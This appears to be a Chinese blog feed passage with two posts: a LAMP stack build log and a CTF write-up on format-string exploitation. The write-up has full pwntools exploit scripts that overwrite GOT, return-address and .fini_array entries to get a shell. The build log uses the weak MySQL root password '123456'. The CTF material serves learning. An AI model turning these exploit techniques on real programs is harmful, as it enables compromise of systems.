/usr/src/lamp/gd-2.0.35/[root@localhost gd-2.0.35]# ./configure --prefix=/usr/local/gd2/ --with-jpeg=/usr/local/jpeg6/ --with-freetype=/usr/local/freetype/ --with-png=/usr/local/libpng/</code></pre><p>这样会爆一个错，然后需要改一下源码：</p><pre><code class="bash">[root@localhost gd-2.0.35]# vim gd_png.c</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/3NJrzC.png" srcset="/img/loading.gif" alt><br>需要指定一下路径即可，这个刚刚是已经安装过的。</p><h2 id="httped"><a href="#httped" class="headerlink" title="httped"></a>httped</h2><p>先装两个工具包：</p><pre><code>cp -r apr-1.4.6 httpd-2.4.7/srclib/aprcp -r apr-util-1.4.1 httpd-2.4.7/srclib/apr-util</code></pre><h3 id="开始装httped："><a href="#开始装httped：" class="headerlink" title="开始装httped："></a>开始装httped：</h3><p>先进入装一下pcre：</p><pre><code>./configuremakemake install</code></pre><p>进入httped：<br>先对配置进行设置：</p><pre><code>./configure --prefix=/usr/local/apache2/ --sysconfdir=/usr/local/apache2/etc --with-include-apr --enable-so --enable-deflate=shared --enable-expires=shared --enable-rewrite=sharedmakemake install</code></pre><h3 id="开服务："><a href="#开服务：" class="headerlink" title="开服务："></a>开服务：</h3><pre><code>/usr/local/apache2/bin/apachectl start</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hdY4Sy.png" srcset="/img/loading.gif" alt></p><h3 id="自启动"><a href="#自启动" class="headerlink" title="自启动"></a>自启动</h3><pre><code>[root@localhost httpd-2.4.7]# vim /etc/rc.d/rc.local</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/eqeQsw.png" srcset="/img/loading.gif" alt></p><p>设置开机时自动启动这个服务。</p><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><h3 id="准备工作-1"><a href="#准备工作-1" class="headerlink" title="准备工作"></a>准备工作</h3><p>装两个工具：</p><pre><code>[root@localhost local]# yum -y install cmake[root@localhost local]# yum -y install bison[root@localhost local]# yum -y install ncurses-devel</code></pre><p>建立一个用户：</p><pre><code>[root@localhost local]# useradd mysql[root@localhost local]# id mysqluid=1001(mysql) gid=1001(mysql) 组=1001(mysql)</code></pre><p>安装ncurses：</p><pre><code>[root@localhost ncurses-5.9]# ./configure --with-shared --without-debug --with-ada --enable-overwrite[root@localhost ncurses-5.9]# make[root@localhost ncurses-5.9]# make install</code></pre><h3 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h3><pre><code>[root@localhost mysql-5.5.23]# cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql \&gt; -DMYSQL_UNIX_ADDR=/tmp/mysql.sock -DEXTRA_CHARSET=all -DDEFAULT_CHARSET=utf8 \&gt; -DDEFAULT_COLLATION=utf8_general_ci -DWITH_MYISAM_STORAGE_ENGINE=1 \&gt; -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_MEMORY_STORAGE_ENGINE=1 \&gt; -DWITH_READLINE=1 -DENABLED_LOCAL_INFILE=1 -DMYSQL_USER=mysql \&gt; -DMYSQL_TCP_PORT=3306</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/kEl78g.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost  mysql-5.5.23]# make[root@localhost  mysql-5.5.23]# make install</code></pre><h3 id="简单设置"><a href="#简单设置" class="headerlink" title="简单设置"></a>简单设置</h3><p>初始化mysql：</p><pre><code>[root@localhost mysql]# chown -R mysql:mysql .[root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/PIJriB.png" srcset="/img/loading.gif" alt><br>设置权限：</p><pre><code>[root@localhost mysql]# chown -R root .[root@localhost mysql]# chown -R mysql data/</code></pre><p>覆盖一下配置文件：</p><pre><code>[root@localhost mysql]# cp support-files/my-medium.cnf /etc/my.cnfcp：是否覆盖&quot;/etc/my.cnf&quot;？ yes</code></pre><p>接着初始化：</p><pre><code>[root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql200408 03:38:45 mysqld_safe Logging to &#39;/usr/local/mysql/data/localhost.localdomain.err&#39;.200408 03:38:45 mysqld_safe Starting mysqld daemon with databases from /usr/local/mysql/data200408 03:38:47 mysqld_safe mysqld from pid file /usr/local/mysql/data/localhost.localdomain.pid ended[root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql[root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql</code></pre><p>发现卡死了：<br><img src="http://qiqianyun.chumen77.xyz/uPic/1KP1pE.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost mysql-5.5.23]# ps aux | grep mysql</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hNLN8i.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost mysql-5.5.23]# kill -9 102872[root@localhost mysql-5.5.23]# ps aux | grep mysqlmysql    103111  0.0  4.9 727288 49260 pts/3    Sl   03:39   0:00 /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/usr/local/mysql/data/localhost.localdomain.err --pid-file=/usr/local/mysql/data/localhost.localdomain.pid --socket=/tmp/mysql.sock --port=3306root     103201  0.0  0.0 112728   972 pts/2    S+   03:46   0:00 grep --color=auto mysql</code></pre><p>杀掉重新来。<br><img src="http://qiqianyun.chumen77.xyz/uPic/CoNvVo.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql[root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/a9Mt08.png" srcset="/img/loading.gif" alt><br>成功了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/fUs1Vd.png" srcset="/img/loading.gif" alt></p><h3 id="自启动-1"><a href="#自启动-1" class="headerlink" title="自启动"></a>自启动</h3><pre><code>[root@localhost mysql-5.5.23]# vim /etc/rc.d/rc.local</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/HTfqIB.png" srcset="/img/loading.gif" alt></p><h3 id="设置mysql密码"><a href="#设置mysql密码" class="headerlink" title="设置mysql密码"></a>设置mysql密码</h3><pre><code>[root@localhost mysql-5.5.23]# /usr/local/mysql/bin/mysqladmin -u root password &quot;123456&quot;[root@localhost mysql-5.5.23]# /usr/local/mysql/bin/mysql -u root -p</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/yHAmIC.png" srcset="/img/loading.gif" alt><br>成功了。注意 <code>history -c</code> 清楚历史记录命令。<br><img src="http://qiqianyun.chumen77.xyz/uPic/SeHAFf.png" srcset="/img/loading.gif" alt><br>服务都正常，字符集格式也在。</p><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><h3 id="准备工作-2"><a href="#准备工作-2" class="headerlink" title="准备工作"></a>准备工作</h3><pre><code>[root@localhost mysql]# yum -y install libtool*[root@localhost local]# yum -y install libpng-devel</code></pre><p>让php支持数据库的内容：</p><pre><code>[root@localhost mysql]# vim /usr/local/gd2/include/gd_io.h</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/MGWJ0l.png" srcset="/img/loading.gif" alt></p><h3 id="开始安装-1"><a href="#开始安装-1" class="headerlink" title="开始安装"></a>开始安装</h3><pre><code>[root@localhost php-5.4.25]# ./configure --prefix=/usr/local/php/ --with-config-file-path=/usr/local/php/etc/ --with-apxs2=/usr/local/apache2/bin/apxs --with-mysql=/usr/local/mysql --with-libxml-dir=/usr/local/libxml2 --with-jpeg-dir=/usr/local/jpeg6/ --with-png-dir=/usr/local/libpng/ --with-freetype-dir=/usr/local/freetype/ --with-gd=/usr/local/gd2/ --with-mcrypt=/usr/local/libmcrypt/ --with-mysqli=/usr/local/mysql/bin/mysql_config --enable-soap --enable-mbstring=all --enable-sockets --with-pdo-mysql=/usr/local/mysql --without-pear</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/6P6yZd.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost php-5.4.25]# make</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/1rlM0o.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost php-5.4.25]# make install</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/PcwG4a.png" srcset="/img/loading.gif" alt></p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><pre><code>[root@localhost php-5.4.25]# mkdir /usr/local/php/etc[root@localhost php-5.4.25]# cp php.ini-production /usr/local/php/etc/php.ini</code></pre><p>复制主配置文件到<code>/usr/local/php/etc</code></p><pre><code>[root@localhost php-5.4.25]# vi /usr/local/apache2/etc/httpd.conf</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/v9mdSe.png" srcset="/img/loading.gif" alt><br>修改apache2配置，让其也可以支持php</p><p>重启apache2:</p><pre><code>[root@localhost php-5.4.25]# /usr/local/apache2/bin/apachectl stopAH00558: httpd: Could not reliably determine the server&#39;s fully qualified domain name, using localhost.localdomain. Set the &#39;ServerName&#39; directive globally to suppress this message[root@localhost php-5.4.25]# /usr/local/apache2/bin/apachectl startAH00558: httpd: Could not reliably determine the server&#39;s fully qualified domain name, using localhost.localdomain. Set the &#39;ServerName&#39; directive globally to suppress this message</code></pre><p>restart 可能是无效的。</p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><h4 id="apache与php"><a href="#apache与php" class="headerlink" title="apache与php"></a>apache与php</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/Jp7nIv.png" srcset="/img/loading.gif" alt></p><pre><code>[root@localhost htdocs]# vi index.php</code></pre><p>写一个php探针：</p><pre><code>&lt;?php        phpinfo();?&gt;</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/zgJ5wo.png" srcset="/img/loading.gif" alt></p><h4 id="apache与MySQL"><a href="#apache与MySQL" class="headerlink" title="apache与MySQL"></a>apache与MySQL</h4><pre><code class="php">&lt;?php$link=mysql_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;123456&#39;);if($link) echo &quot;Congratulations!!!!!!&quot;;mysql_close();?&gt;</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/RQRH44.png" srcset="/img/loading.gif" alt></p><h3 id="phpadmin搭建"><a href="#phpadmin搭建" class="headerlink" title="phpadmin搭建"></a>phpadmin搭建</h3><pre><code>[root@localhost lamp1]# cp -r phpMyAdmin-4.1.4-all-languages /usr/local/apache2/htdocs/phpmyadmin</code></pre><h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><pre><code>[root@localhost phpmyadmin]# cp config.sample.inc.php config.inc.php[root@localhost phpmyadmin]# vi config.inc.php</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/T9QoLf.png" srcset="/img/loading.gif" alt><br>访问测试：<br><img src="http://qiqianyun.chumen77.xyz/uPic/UK2Vd0.png" srcset="/img/loading.gif" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Lamp搭建记录&quot;&gt;&lt;a href=&quot;#Lamp搭建记录&quot; class=&quot;headerlink&quot; title=&quot;Lamp搭建记录&quot;&gt;&lt;/a&gt;Lamp搭建记录&lt;/h1&gt;&lt;h2 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞小总结（下）</title>
    <link href="http://chumen77.xyz/2020/04/03/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <id>http://chumen77.xyz/2020/04/03/格式化字符串漏洞小总结（下）/</id>
    <published>2020-04-03T08:59:50.107Z</published>
    <updated>2020-04-05T14:59:16.833Z</updated>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞小总结（下）"><a href="#格式化字符串漏洞小总结（下）" class="headerlink" title="格式化字符串漏洞小总结（下）"></a>格式化字符串漏洞小总结（下）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>接着上一篇，这一篇主要记录一下对于这个漏洞的利用和ctf赛题中常见的套路和考法。</p><h2 id="格式化字符串在栈上"><a href="#格式化字符串在栈上" class="headerlink" title="格式化字符串在栈上"></a>格式化字符串在栈上</h2><h3 id="劫持got"><a href="#劫持got" class="headerlink" title="劫持got"></a>劫持got</h3><ul><li>每次 call libc 中的函数时都会去GOT表中查询来找出程序下一步要jmp的位址</li><li>可以通过 fmt 构造写入一个目标地址，改掉 GOT 表上的地址使得call该函数时变成jmp到我们要的目标地址去<br>例如 ：<br>将 printf 改成 system，原本 printf (“sh’’）就直接变成 system (“sh”),便可以拿到shell。<br>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/0G62iR.png" srcset="/img/loading.gif" alt><br>这一攻击过程可以分为以下几个步骤：</li><li>确定一下printf函数的GOT表的地址，如图中是<code>0x804a010</code></li><li>确定一下system函数的内存地址或者plt（通常都需要泄漏一下libc的基地址，然后加上偏移算出，当然也会遇到程序直接存在system函数，那么就是plt）</li><li>在栈上构造出printf函数GOT表的地址</li><li>利用fmt漏洞修改printf函数GOT表上的地址</li></ul><p>然后看一个例题：</p><h4 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy-echo"></a>inndy-echo</h4><h5 id="保护和arch"><a href="#保护和arch" class="headerlink" title="保护和arch"></a>保护和arch</h5><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h5 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp){  char s; // [esp+Ch] [ebp-10Ch]  unsigned int v4; // [esp+10Ch] [ebp-Ch]  v4 = __readgsdword(0x14u);  setvbuf(stdin, 0, 2, 0);  setvbuf(stdout, 0, 2, 0);  do  {    fgets(&amp;s, 256, stdin);    printf(&amp;s);  }  while ( strcmp(&amp;s, &quot;exit\n&quot;) );  system(&quot;echo Goodbye&quot;);  exit(0);}</code></pre><p>可以看到会无限的打印你输入的东西，那就意味着可以无限次触发这个漏洞。并且还有system这个函数，那可以直接找其plt。</p><h6 id="攻击思路："><a href="#攻击思路：" class="headerlink" title="攻击思路："></a>攻击思路：</h6><ul><li>在栈上放好printf函数的GOT表地址，并确定一下偏移</li><li>改这个GOT上的地址为system函数的plt</li><li>改好一会，传送一个<code>/bin/sh</code>，此时就会变成<code>system(/bin/sh)</code></li></ul><p>在执行的过程中需要注意一下，改GOT表上的值<strong>要单次printf多次写入</strong>，否则只改一般程序会出现无法预料的情况。还有就是需要注意一下<strong>字节对齐</strong>。</p><h5 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h5><pre><code>gdb-peda$ stack 0x200000| 0xffffd250 --&gt; 0xffffd26c (&quot;AAAA\n&quot;)0004| 0xffffd254 --&gt; 0x1000008| 0xffffd258 --&gt; 0xf7fb25a0 --&gt; 0xfbad208b0012| 0xffffd25c --&gt; 0x00016| 0xffffd260 --&gt; 0xf7ffd000 --&gt; 0x23f400020| 0xffffd264 --&gt; 0x80482e7 (&quot;__libc_start_main&quot;)0024| 0xffffd268 --&gt; 0xf63d4e2e0028| 0xffffd26c (&quot;AAAA\n&quot;)</code></pre><pre><code>gdb-peda$ fmtarg 0xffffd26cThe index of format argument : 7 (&quot;\%6$p&quot;)</code></pre><p>确定偏移是7，但需要注意字节对齐，打算一会在写payload时候，就<code>().ljust</code>补成0x20的<code>a</code>，也就是<code>offset = 7 + 0x20/4 = 15</code></p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = 0x08048400for i in range(2):    payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,15+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x20,&#39;a&#39;) + p32(printf_got) + p32(printf_got+2)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p>换一种就是用pwntools中针对格式化字符串漏洞利用模块中的函数<code>fmtstr_payload</code>，面对32位，这种情况还是很好用的：</p><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = process(&#39;./echo&#39;)io = remote(&#39;node3.buuoj.cn&#39;,26990)system_plt = 0x08048400printf_got = 0x0804A010payload = fmtstr_payload(7,{printf_got : system_plt})io.sendline(payload)io.send(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/TxIVwQ.png" srcset="/img/loading.gif" alt><br>可以看一下其生成的payload，把目标地址信息放在开头，在64位是肯定是不可行的。（不过听说pwntools的新版本是已经支持64位了，但是本人一直没有更新成功，所以也没有测试）</p><h3 id="劫持retaddress"><a href="#劫持retaddress" class="headerlink" title="劫持retaddress"></a>劫持retaddress</h3><p>顾名思议，就是利用格式化串漏洞来修改函数的返回地址到我们想要jmp的地址。常见套路：</p><ul><li>jmp到带有<code>system(/bin/sh)</code> 的后门函数</li><li>不开nx保护，jmp到自己构造的shellcode上。</li><li>提前泄漏libc算出libc的base，jmp到onegadget地址</li></ul><p>看一个简单的例子：</p><h4 id="三个白帽-pwnme-k0"><a href="#三个白帽-pwnme-k0" class="headerlink" title="三个白帽 - pwnme-k0"></a>三个白帽 - pwnme-k0</h4><h5 id="保护和arch-1"><a href="#保护和arch-1" class="headerlink" title="保护和arch"></a>保护和arch</h5><pre><code>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p>64位程序，且开启了RELRO保护，这样就无法修改got表了。</p><h5 id="ida分析-1"><a href="#ida分析-1" class="headerlink" title="ida分析"></a>ida分析</h5><p>这个程序实现了一个注册用户的功能，注册好后可以来展示用户信息，修改用户信息，和退出程序。其中在展示用户信息当中，存在格式化字符串漏洞：</p><pre><code class="c">int __fastcall sub_400B07(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9){  write(0, &quot;Welc0me to sangebaimao!\n&quot;, 0x1AuLL);  printf(&amp;formata, &quot;Welc0me to sangebaimao!\n&quot;);  return printf(&amp;a9 + 4);}</code></pre><p>并且发现其中输出的buf就是你输入的密码：<br><img src="http://qiqianyun.chumen77.xyz/uPic/o8t1UX.png" srcset="/img/loading.gif" alt></p><p>还发现其中有个后门函数：<br><img src="http://qiqianyun.chumen77.xyz/uPic/lRHun0.png" srcset="/img/loading.gif" alt></p><p>会调用system函数给你shell，那攻击思路也就是去修改程序中某个函数的返回地址，直接返回到这里就拿到shell了。</p><h5 id="gdb调试："><a href="#gdb调试：" class="headerlink" title="gdb调试："></a>gdb调试：</h5><p>定位到这个存在漏洞的printf当中，确定一下：<br><img src="http://qiqianyun.chumen77.xyz/uPic/MsdWDQ.png" srcset="/img/loading.gif" alt><br>看一下此时的栈情况，输入的usename可以确定偏移是8，并且rdi也是指向了存放password的地址。</p><p>然后发现栈上也有很多栈的地址信息，当程序第二次运行到这里的时候，发现这里esp对应的地址信息也是不会变的。所以就可以通过泄漏这里的值来算出存放ret address的栈地址。</p><p>然后让程序运行到修改用户信息的函数，这下把ret address的point放到栈上，接着就可以开始修改ret address的值了。</p><h5 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./pwnme_k0&#39;)# context.clear(arch = &#39;amd64&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;%0006$lx&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(&#39;11111111&#39;)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)# io.recvuntil(&#39;Welc0me to sangebaimao!\n&#39;)stack = int(io.recvline_contains(&#39;7f&#39;),16)print(stack)ret_add = stack - 0x38# system_add = 0x04008AApayload = &#39;%2218c%8$hn&#39;io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;2&#39;)io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(p64(ret_add))io.recvuntil(&#39;lenth:20): \n&#39;)io.sendline(payload)io.recvuntil(&#39;&gt;&#39;)io.sendline(&#39;1&#39;)io.interactive()</code></pre><h3 id="修改FINI-ARRAY区"><a href="#修改FINI-ARRAY区" class="headerlink" title="修改FINI_ARRAY区"></a>修改<code>FINI_ARRAY</code>区</h3><p>在上面的两个例子中可以发现,之所以能成功利用格式化字符串漏洞getshell,很多时候都是因为程序中存在循环，让我们可以多次触发格式化字符串漏洞。如果程序中不存在循环呢?利用ROP劫持函数返回地址到start可以实现；当存在格式化字符串漏洞时，使用这个漏洞也做到这一<br>点。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/NgjlR4.png" srcset="/img/loading.gif" alt><br>简单地说,一个程序在调用 main函数前会调用<code>.init</code>段代码和 <code>.init_array</code> 段的函数数组中每一个函数指针。同样的,main 函数结束后也会调用<code>.fini</code>段代码和 <code>.fini_arrary</code> 段的函数数组中的每一个函数指针。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/ioam7T.png" srcset="/img/loading.gif" alt><br>其中<code>FINI_ARRAY</code>区：程序结束需要经过这里，是可以修改一下这里的析构函数。修改<code>.fini_array</code>区的第一个元素为start，就可以实现让程序从头再来一次，也就又可以用一次漏洞。</p><p>需要注意的是,这个区的内容在再次从start开始执行后又会被修改。</p><h4 id="mma-ctf-2nd-2016-greeting"><a href="#mma-ctf-2nd-2016-greeting" class="headerlink" title="mma-ctf-2nd-2016-greeting"></a>mma-ctf-2nd-2016-greeting</h4><h5 id="保护和arch-2"><a href="#保护和arch-2" class="headerlink" title="保护和arch"></a>保护和arch</h5><pre><code>    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h5 id="ida分析-2"><a href="#ida分析-2" class="headerlink" title="ida分析"></a>ida分析</h5><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  char s; // [esp+1Ch] [ebp-84h]  char v5; // [esp+5Ch] [ebp-44h]  unsigned int v6; // [esp+9Ch] [ebp-4h]  v6 = __readgsdword(0x14u);  printf(&quot;Please tell me your name... &quot;);  if ( !getnline(&amp;v5, 64) )    return puts(&quot;Don&#39;t ignore me ;( &quot;);  sprintf(&amp;s, &quot;Nice to meet you, %s :)\n&quot;, &amp;v5);  return printf(&amp;s);}</code></pre><p>发现函数在触发格式化字符串漏洞以后就结束了，没有在调用其他的函数，也就无法利用GOT劫持或者修改ret addr。<br>再看下getnline函数：</p><pre><code class="c">size_t __cdecl getnline(char *s, int n){  char *v3; // [esp+1Ch] [ebp-Ch]  fgets(s, n, stdin);  v3 = strchr(s, 10);  if ( v3 )    *v3 = 0;  return strlen(s);}</code></pre><p>发现有了strlen的函数，并且其参数也是可以控制的。<br>这就有了攻击思路，在触发格式化字符串的漏洞时：</p><ul><li>修改<code>.fini_array</code>区的一个函数指针地址为start，让其重启跑一次程序</li><li>因为知道肯定会跑到strlen那里，所以在劫持strlen的GOT为system</li><li>待程序重新跑起来，就在传送一个<code>/bin/sh</code>即可</li></ul><p>注意的是,这个<code>.fini_array</code>区的内容在再次从start开始执行后又会被修改,且程序可读取的字节数有限,因此需要同时修改两个地址，也就是单次printf多次写入，这个题并且需要合理调整payload。</p><h5 id="gdb调试-1"><a href="#gdb调试-1" class="headerlink" title="gdb调试"></a>gdb调试</h5><p><img src="http://qiqianyun.chumen77.xyz/uPic/wRVcqD.png" srcset="/img/loading.gif" alt><br>这个题目因为前面有</p><pre><code class="c">sprintf(&amp;s, &quot;Nice to meet you, %s :)\n&quot;, &amp;v5);</code></pre><p>所以其栈上会放上<code>Nice to meet you,</code>的字符串，此时需要注意对齐。对齐后发现偏移为12，在写payload的时候可以使用单次printf多次写入的脚本，所以来<code>().ljust(0x32,&#39;a&#39;)</code> ,所以偏移需要加上<code>(0x32 - 2)/4</code> =  24 </p><h5 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">from pwn import *context.arch = &#39;i386&#39;context.log_level = &#39;debug&#39;io = process(&#39;./greeting&#39;)# io = remote(&#39;111.198.29.45&#39;,42729)elf = ELF(&#39;./greeting&#39;)strlen_got = 0x08049A54fini_array = 0x08049934start = 0x080484F0system_plt = 0x08048490offset = 12def fmt_short(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultkey1 = 0x08048490prev = 18 #注意这个题在可控格式化字符串前有字符输出payload = &quot;&quot;for i in range(2):    payload +=fmt_short(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,24+i)     prev = (key1 &gt;&gt; i*16) &amp; 0xffffkey2 = 0x84F0for i in range(1):    payload +=fmt_short(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,26+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x32,&#39;a&#39;)payload += p32(strlen_got) + p32(strlen_got+2) +p32(fini_array)io.recvuntil(&#39;name...&#39;)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;name...&#39;)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><h3 id="小tips"><a href="#小tips" class="headerlink" title="小tips"></a>小tips</h3><h4 id="绕过canary"><a href="#绕过canary" class="headerlink" title="绕过canary"></a>绕过canary</h4><p>可以利用fmt漏洞，任意读的特性，在有canary的程序中，算好偏移以后读出canary存的检验值（基本都是以00结尾比较好找），然后在buffer overflow 时，在对应位置填上canary检验值，即可绕过canary。</p><h4 id="printf家族的其他函数"><a href="#printf家族的其他函数" class="headerlink" title="printf家族的其他函数"></a>printf家族的其他函数</h4><p>首先要记得一点函数参数的入栈顺序，大多是从右到左依次入栈，在遇到其他的printf类函数，在确定偏移时，一定要要把握fmt是在栈上的那个位置，然后进行计算偏移（不能简单的利用pwndbg的fmtarg了）。</p><ul><li>fprintf：基本上一样，只是format string 不在第一参数，使得overwrite function table 时很难使用</li><li>sprintf：可以用%xxc 来造成新的buffer overflow </li></ul><h4 id="劫持-stack-chk-fail"><a href="#劫持-stack-chk-fail" class="headerlink" title="劫持__stack_chk_fail"></a>劫持<code>__stack_chk_fail</code></h4><ul><li>在无法 stack overflow 也没有其它函数可以劫持时，可以使用修改<code>__stack_chk_fail</code> 的 G0T 并且破坏 canary 使这个函数被call，然后jmp想要的目标地址</li><li>在只有一次 stack overflow+fmt 时可以将<code>__stack_chk_fail</code>改成直接ret ，这样stack overflow 时可以无视canary ，也可以放上ROP链，进而进入之后的ROP。</li></ul><h2 id="格式化字符串不在栈上"><a href="#格式化字符串不在栈上" class="headerlink" title="格式化字符串不在栈上"></a>格式化字符串不在栈上</h2><p>有时候并不会这么刚好 format string 的 buf 在栈上当其在 data, bss 或是 heap 上的情况，无法在 stack 中放上一个 address 给任意读写的时候，可以使用在  stack 上现有的 pointer 进行写值。其中最常用的就是栈上现有的EBP链。</p><h3 id="EBP链"><a href="#EBP链" class="headerlink" title="EBP链"></a>EBP链</h3><p>￼<img src="http://qiqianyun.chumen77.xyz/uPic/Y9ykIj.png" srcset="/img/loading.gif" alt><br>正如这个图，当一个程序完成了由main—&gt;A—&gt;B的函数调用，栈上就会存在一个EBP链，像图中的ebp3(B)—&gt;ebp2(A)—&gt;ebp1(main)，然后</p><ul><li>通过找准offset1(算一下ebp3与fmt字符串距离)对EBP2使用%hhn，就可以修改到EBP1的最低位，使得EBP1在一个256的范围内进行变化，可以改成你想要修改的栈内存单元指针（比如ret address的栈指针）。</li><li>改写好EBP1后，找准offset2 (算一下EBP2与fmt字符串距离)再对EBP1使用%hhn或者%hn，即可完成对你想要修改的地址的写值。</li></ul><p>简单来说，这个攻击过程就是第一次使用漏洞是构造出我们要读写的地址，再一次则是对前面构造出来的地址进行任意读写。但需要注意的是，<strong>在这个过程当中一定要学会对栈上的已有数据的灵活的运用</strong>。</p><p>接下来看一个题来仔细分析一下</p><h4 id="hitcontraining-playfmt"><a href="#hitcontraining-playfmt" class="headerlink" title="hitcontraining-playfmt"></a>hitcontraining-playfmt</h4><h5 id="保护和arch-3"><a href="#保护和arch-3" class="headerlink" title="保护和arch"></a>保护和arch</h5><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX 